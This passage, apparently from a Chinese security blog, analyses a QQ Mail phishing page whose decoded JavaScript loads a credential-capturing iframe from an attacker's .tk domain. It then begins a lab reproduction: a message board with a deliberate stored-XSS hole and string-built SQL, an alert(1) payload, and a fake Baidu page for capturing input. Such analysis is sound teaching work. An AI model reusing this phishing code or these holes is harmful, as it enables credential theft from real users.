class="hljs-string">&#x27;px&#x27;</span>;</span><br>		&#125;;<br><br><span class="javascript">		<span class="hljs-built_in">document</span>.documentElement.style.overflow = <span class="hljs-string">&quot;hidden&quot;</span>;</span><br>		_s();<br><span class="javascript">		<span class="hljs-built_in">window</span>.addEventListener?<span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&#x27;resize&#x27;</span>,_s,<span class="hljs-literal">false</span>):(<span class="hljs-built_in">window</span>.attachEvent&amp;&amp;<span class="hljs-built_in">window</span>.attachEvent(<span class="hljs-string">&#x27;onresize&#x27;</span>,_s));</span><br>	&#125;<br>&#125;)();<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">html</span>&#123;<span class="hljs-attribute">overflow</span>:hidden;&#125;<span class="hljs-selector-tag">body</span>&#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">100%</span>;<span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">scroll</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;iframe&quot;</span>   <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span>  <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>   <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span>&gt;</span>   <br><span class="javascript">               <span class="hljs-keyword">var</span> pos,str,para,url;  </span><br><span class="javascript">                str = <span class="hljs-built_in">window</span>.location.href;  </span><br><span class="javascript">                pos = str.indexOf(<span class="hljs-string">&quot;?&quot;</span>)  ;</span><br>                url = str.substring(pos 1);  <br>                if (pos&gt;0)&#123;  <br><span class="javascript">				n=<span class="hljs-string">&#x27;http://ujhgdgjalkfja2.tk/&#x27;</span>;</span><br>				j1=n url;<br><span class="handlebars"><span class="xml">				c=&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;shortcut icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://s.tbcdn.cn/apps/login/static/img/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span>&#x27;;</span></span><br><span class="handlebars"><span class="xml">				b=&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">html</span>&#123;<span class="hljs-attribute">overflow</span>:hidden;&#125;<span class="hljs-selector-tag">body</span>&#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">100%</span>;<span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">scroll</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>&#x27;;</span></span><br><span class="handlebars"><span class="xml">				a=&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;main&quot;</span>  <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#x27;;</span></span></span></span><br><span class="javascript">				k1=<span class="hljs-string">&#x27;&quot; width=&quot;101%&quot;  frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;&#x27;</span>;</span><br><span class="javascript"> 				<span class="hljs-keyword">var</span>  d =  <span class="hljs-built_in">window</span>.frames[<span class="hljs-number">0</span>];</span><br>  				d.document.write(c b a j1 k1);   <br>                &#125;  <br><span class="javascript">                <span class="hljs-keyword">else</span>  </span><br>                &#123;  <br>                &#125;  <br>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>&quot;));<br>//--&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;));<br>//--&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<p>我们解码出完整代码就可以看到，他使用javascript的document.write方法，动态写入html页面覆盖整个文档，因为这么大量的js动态写入会非常慢，所以他在页面没有加载完之前，使用了“加载中”来掩盖这个网站原有的内容。</p>
+<p>他前面大部分代码应该是从别人钓鱼qq空间用的代码中提取出来的，所以那部分css和js有很多不合理的地方，而且整个页面背景与登陆框都是调用他自己服务器保存好的截图，不是用html和css写出来的，导致不能完整的模仿出qq邮箱的一些样式，欺骗性大大降低。</p>
+<p>最后的部分也就是他真正用来盗取账号密码的部分，攻击者远程调用了一个iframe框架,使用js依次将写好的变量c b a j1 k1的内容动态写入当前页面</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;iframe&quot;</span>   <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span>  <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>   <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span>&gt;</span>   <br><span class="javascript">               <span class="hljs-keyword">var</span> pos,str,para,url;  </span><br><span class="javascript">                str = <span class="hljs-built_in">window</span>.location.href;  </span><br><span class="javascript">                pos = str.indexOf(<span class="hljs-string">&quot;?&quot;</span>)  ;</span><br>                url = str.substring(pos 1);  <br>                if (pos&gt;0)&#123;  <br><span class="javascript">				n=<span class="hljs-string">&#x27;http://ujhgdgjalkfja2.tk/&#x27;</span>;</span><br>				j1=n url;<br><span class="handlebars"><span class="xml">				c=&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;shortcut icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://s.tbcdn.cn/apps/login/static/img/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span>&#x27;;</span></span><br><span class="handlebars"><span class="xml">				b=&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">html</span>&#123;<span class="hljs-attribute">overflow</span>:hidden;&#125;<span class="hljs-selector-tag">body</span>&#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">100%</span>;<span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">scroll</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>&#x27;;</span></span><br><span class="handlebars"><span class="xml">				a=&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;main&quot;</span>  <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#x27;;</span></span></span></span><br><span class="javascript">				k1=<span class="hljs-string">&#x27;&quot; width=&quot;101%&quot;  frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;&#x27;</span>;</span><br><span class="javascript"> 				<span class="hljs-keyword">var</span>  d =  <span class="hljs-built_in">window</span>.frames[<span class="hljs-number">0</span>];</span><br>  				d.document.write(c b a j1 k1);   <br>                &#125;  <br><span class="javascript">                <span class="hljs-keyword">else</span>  </span><br>                &#123;  <br>                &#125;  <br>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>其中</p>
+<ul>
+<li>str=window.location.href是获取当前url赋值给str</li>
+<li>pos=str.indexOf(“?”)是寻找str字符串也就是当前url中第一次出现?的位置并且返回给pos</li>
+<li>url=str.substring(pos 1)是将pos到结束的字符串返回给url，后面的1小于pos的话，就是将从第一位到?的字符串返回给url</li>
+</ul>
+<p>前面我们已经知道windows.location.href是<a target="_blank" rel="noopener" href="http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb">http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb</a></p>
+<p>那么这里url就是xmk/youx1?id=qyshz107&amp;/OdJb</p>
+<p>然后整个页面的结果就是：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;shortcut icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://s.tbcdn.cn/apps/login/static/img/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">html</span>&#123;<span class="hljs-attribute">overflow</span>:hidden;&#125;<span class="hljs-selector-tag">body</span>&#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">100%</span>;<span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;&#125;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">scroll</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;main&quot;</span>  <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;101%&quot;</span>  <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>典型的iframe框架钓鱼，这个时候我们如果在登陆框输入东西，实际上是在对方服务器的一个页面 <a target="_blank" rel="noopener" href="http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb">http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb</a> 内输入东西，如果不确定的话我们可以直接访问这个链接看一眼，发现的确是一个制作好的邮箱页面。那么已经到了对方服务器上面的，你的输入对方想怎么记录怎么保存都可以。如果之前输入了账号密码，此时已经在服务器上保存了，对方的目的其实已经达到。</p>
+<p>但是进一步抓包测试，发现对方在这里接收了账号密码并保存之后，还会传输数据到真正的qq邮箱地址去登陆，然后返回是否成功登陆的信息，如果失败就返回账号密码错误信息。如果成功登陆，就会控制windows.location.href跳转到真正的qq邮箱mail.qq.com，这样减轻用户的嫌疑。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing05.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing06.png" srcset="/img/loading.gif" lazyload></p>
+<p>至此，对方的整个钓鱼过程就完成了，如果他的细节处理好一点，对一些萌新就能瞒天过海了。</p>
+<p>这个ujhgdgjalkfja2.tk就是对方的域名了，.tk后缀可能大家不常见，但是实际上这是一个注册量非常庞大的顶级域名。</p>
+<p>百科中是这样说的：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing07.png" srcset="/img/loading.gif" lazyload></p>
+<p>.TK的域名是南太平洋一个仅有1,268人的岛国托克劳（历史上亦称联合群岛或托克劳群岛）的国家顶级域名。它是任何人都可以申请的免费的顶级域名之一。(ccTLD).TK已拥有活跃域名2500万个，成为了世界第一大ccTLD。</p>
+<p>既然是免费的国外域名，那么.tk域名一定是很多不法分子所钟爱的。这个域名通过域名反查和ip地址也基本得不到太多有用的信息。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing08.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x03-复现-环境搭建"><a href="#0x03-复现-环境搭建" class="headerlink" title="0x03 复现-环境搭建"></a>0x03 复现-环境搭建</h2><p>之前在 <a target="_blank" rel="noopener" href="http://uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a> 中提到了钓鱼的几种方式，其中iframe框架钓鱼只描述了一下原理并且用了一个小例子，那么就在这里补充下存储型xss怎么调用iframe钓鱼。</p>
+<p>既然要复现整个钓鱼过程，我们就要用到一个存在存储型xss漏洞的页面、一个伪造的html页面、一个接收伪造页面传输的数据的php文件、一个保存数据的txt文件。</p>
+<h4 id="留言系统搭建"><a href="#留言系统搭建" class="headerlink" title="留言系统搭建"></a>留言系统搭建</h4><p>首先搭建存在存储型xss漏洞的页面，我们在这里搭建一个简易的留言系统进行测试，一共需要用到message.php和save.php两个页面。</p>
+<p>其中message.php负责输入留言和展示留言，代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>留言系统<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:500px;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align:left;&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;save.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>昵&amp;nbsp&amp;nbsp称：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>留&amp;nbsp&amp;nbsp言：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>&lt;?php<br>$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;,&quot;test&quot;);<br>if(!$con)&#123;<br> die(&quot;database connect error!&quot;);<br>&#125;<br><br>$result=mysqli_query($con,&quot;select `name`, `message` from mess;&quot;);<br><br>while($row = $result-&gt;fetch_assoc()) &#123;<br>        echo &quot;<span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>Name: &quot; . urldecode($row[&quot;name&quot;]). &quot;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>  Message: &quot; . urldecode($row[&quot;message&quot;]). &quot;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>&quot;;<br>&#125; <br><br><br>?&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>save.php负责将接收到的昵称和留言上传到数据库，并跳转回message.php这里数据库内只要新建名为mess的表，存在name和message两个字段即可实现这个功能。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;?php<br><br>$name = urlencode($_REQUEST[&#x27;name&#x27;]);<br>$message = urlencode($_REQUEST[&#x27;message&#x27;]);<br>echo &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>&#x27;;<br><br>$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;,&quot;test&quot;);<br>if(!$con)&#123;<br> die(&quot;database connect error!&quot;);<br>&#125;<br><br><br><br>if($name&amp;&amp;$message)<br>&#123;<br>	<br>	mysqli_query($con,&quot;INSERT INTO `mess` (`name`, `message`) VALUES (&#x27;&quot;.$name.&quot;&#x27;, &#x27;&quot;.$message.&quot;&#x27;);&quot;);<br>&#125;<br><br>echo &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span>&gt;</span>&#x27;;<br><span class="javascript">echo <span class="hljs-string">&quot;location.href=&#x27;./message.php&#x27;&quot;</span>;</span><br>echo &#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&#x27;;<br><br><br>?&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>然后我们发现输入正常留言可以显示出来：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing09.png" srcset="/img/loading.gif" lazyload></p>
+<p>构造一个xss代码</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>也可以正常运行，证明存在存储型xss：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing10.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="服务器接收页面"><a href="#服务器接收页面" class="headerlink" title="服务器接收页面"></a>服务器接收页面</h4><p>我们的服务器上，要有一个可供调用的伪造html页面，一个接收数据的php文件，一个储存数据的txt文件。</p>
+<p>这里我伪造一个百度的主页进行测试，来捕获这个人搜索的信息。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;image/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;shortcut icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;image/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>百度一下，你就知道<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br> 	<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br> 	.dd&#123;<br><span class="css"> 	<span class="hljs-attribute">color</span>: gray;</span><br><span class="css"> 	<span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;微软雅黑&quot;</span>;</span><br> 	&#125;<br><span class="css"> 	<span class="hljs-selector-class">.dd</span> <span class="hljs-selector-tag">a</span>&#123;</span><br><span class="css"> 	<span class="hljs-attribute">color</span>: gray;</span><br><span class="css"> 	<span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;微软雅黑&quot;</span>;</span><br> 	&#125;<br><span class="css"> 	<span class="hljs-selector-class">.aa</span> <span class="hljs-selector-tag">a</span>&#123;</span><br><span class="css"> 	<span class="hljs-attribute">color</span>: <span class="hljs-number">#000000</span>;</span><br><span class="css"> 	<span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;微软雅黑&quot;</span>;</span><br><span class="css"> 	<span class="hljs-attribute">font-size</span>: <span class="hljs-number">15px</span>;</span><br> 	&#125;<br><span class="css"> 	<span class="hljs-selector-tag">body</span>&#123;</span><br><span class="css"> 	<span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;</span><br><span class="css"> 	<span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;</span><br> 	&#125;<br><span class="css"> 	<span class="hljs-attribute">font</span><span class="hljs-selector-pseudo">:hover</span>&#123;</span><br><span class="css"> 	<span class="hljs-attribute">cursor</span>: pointer;</span><br><span class="css"> 	<span class="hljs-attribute">color</span>: red;</span><br> 	&#125;<br> 	.back-img&#123;<br><span class="css"> 	<span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000000</span>;</span><br><span class="css"> 	<span class="hljs-attribute">position</span>: absolute;</span><br><span class="css"> 	<span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><br><span class="css"> 	<span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;</span><br><span class="css"> 	<span class="hljs-attribute">top</span>: <span class="hljs-number">0px</span>;</span><br><span class="css"> 	<span class="hljs-attribute">left</span>: <span class="hljs-number">0px</span>;</span><br><span class="css"> 	<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#000000</span>;</span><br><span class="css"> 	<span class="hljs-attribute">opacity</span>: <span 